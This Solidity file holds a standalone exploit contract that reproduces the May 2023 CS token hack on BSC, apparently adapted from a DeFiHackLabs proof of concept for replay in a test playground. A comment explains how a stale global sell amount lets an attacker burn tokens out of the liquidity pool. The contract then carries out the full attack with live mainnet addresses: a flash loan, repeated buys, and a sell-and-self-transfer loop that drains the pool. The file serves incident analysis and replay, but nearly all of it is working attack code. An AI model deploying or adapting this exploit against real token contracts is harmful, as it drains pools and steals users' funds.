// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-05-CS).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (CSExp is Test, IPancakeCallee; attacker = address(this)) — the
// flash-swap callback `pancakeCall` lives on the test contract itself, so
// there is no standalone contract to deploy as-is. This file is a faithful,
// self-contained copy of that inline attack (testExp -> run, pancakeCall
// unchanged) so the playground can deploy it and record run(). Logic and
// constants are copied verbatim from test/CS_exp.sol.
//
// Root cause (real CS token hack, BSC, 2023-05, tx
// 0x906394b2ee093720955a7d55bff1666f6cf6239e46bea8af99d6352b9687baa4):
// CS is a fee-on-transfer / "deflation" token whose sell path stores the size
// of the most recent sell in a GLOBAL variable `sellAmount` (CS.sol:707,
// `sellAmount = amount;`) but does not burn or clear anything in that same
// call. The burn only happens later, inside the private `sync()`
// (CS.sol:735-751), which is itself gated on `sellAmount >= 1` and is
// triggered by the NEXT ordinary transfer through `_transfer` (CS.sol:690-693)
// — including a trivial self-transfer of 2 wei that anyone can make. `sync()`
// reads the stale global `sellAmount`, computes `burnAmount = sellAmount *
// 800 / 1000` (CS.sol:739, 80% of the last sell), and deletes that much CS
// directly out of the CS/BUSD pair's own balance, then force-calls
// `pair.sync()` to re-anchor reserves — an un-compensated one-sided reserve
// deletion that no swap pays for.
//
// The attacker turns this into a money pump in one flash-swap callback:
//  1. Flash-borrows 80,000,000 BUSD from an unrelated Pancake pair (a
//     `swap()` with non-empty `data` triggers `pancakeCall` on the borrower).
//  2. Buys CS 99x with 5,000 BUSD-worth each (pumping/thinning the CS side of
//     the CS/BUSD pool), then dumps the remaining ~79.6M BUSD for CS into an
//     unrelated address — leaving the pool CS-scarce and BUSD-heavy.
//  3. Repeatedly sells 3,000 CS (sets the stale `sellAmount = 3,000 CS`) then
//     self-transfers 2 wei of CS (the trivial transfer that fires `sync()`
//     and burns `3,000 * 0.8 = 2,400` CS straight out of the pool). With CS
//     already scarce, each burn inflates the CS price further, so each
//     successive 3,000-CS sell extracts a larger slug of BUSD.
//  4. Repays the 80,240,000 BUSD flash loan and keeps the difference
//     (~684,175 BUSD).

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPancakeRouter {
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPancakeCallee {
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract CSDrain is IPancakeCallee {
    IPancakePair constant pair = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IPancakeRouter constant router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IERC20Min constant BUSD = IERC20Min(0x55d398326f99059fF775485246999027B3197955);
    IERC20Min constant CS = IERC20Min(0x8BC6Ce23E5e2c4f0A96429E3C9d482d74171215e);

    // Faithful copy of testExp(): kick off the flash swap with non-empty
    // data so PancakeSwap calls back into pancakeCall() below.
    function run() external {
        pair.swap(80_000_000 ether, 0, address(this), bytes("123"));
    }

    // Faithful copy of the inline pancakeCall() attack body.
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == address(pair));
        BUSD.approve(address(router), BUSD.balanceOf(address(this)));
        address[] memory path = new address[](2);
        path[0] = address(BUSD);
        path[1] = address(CS);
        for (uint256 i = 0; i < 99; ++i) {
            router.swapTokensForExactTokens(
                5000 ether, BUSD.balanceOf(address(this)), path, address(this), block.timestamp + 1000
            );
        }
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            BUSD.balanceOf(address(this)), 1, path, 0x382e9652AC6854B56FD41DaBcFd7A9E633f1Edd5, block.timestamp + 1000
        );
        CS.approve(address(router), CS.balanceOf(address(this)));
        path[0] = address(CS);
        path[1] = address(BUSD);
        while (CS.balanceOf(address(this)) >= 3000 ether) {
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                3000 ether, 1, path, address(this), block.timestamp + 1000
            );
            CS.transfer(address(this), 2);
        }
        BUSD.transfer(msg.sender, 80_240_000 ether);
    }

    receive() external payable {}
}
